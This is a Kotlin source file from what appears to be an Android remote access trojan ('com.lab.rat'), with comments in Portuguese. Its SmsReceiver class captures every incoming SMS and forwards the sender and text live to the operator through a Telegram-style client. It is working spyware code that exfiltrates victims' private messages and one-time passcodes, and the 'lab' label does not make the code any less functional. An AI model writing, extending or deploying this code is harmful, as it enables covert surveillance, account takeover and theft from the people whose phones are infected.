package com.lab.rat.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.lab.rat.core.ServiceGraph
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        val pending = goAsync() // mantém o processo vivo durante o envio
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        val body = msgs.joinToString("") { it.displayMessageBody ?: "" }
        val from = msgs.firstOrNull()?.originatingAddress ?: "?"
        val tg = ServiceGraph.tg
        if (tg == null) {
            pending.finish()
            return
        }
        // dispara no escopo do receiver; finish() só depois do envio
        val scope = kotlinx.coroutines.CoroutineScope(
            kotlinx.coroutines.Dispatchers.IO + kotlinx.coroutines.Job())
        scope.launch {
            try { tg.sendText("SMS ao vivo\nDe: $from\n$body") }
            finally { pending.finish() }
        }
    }
}
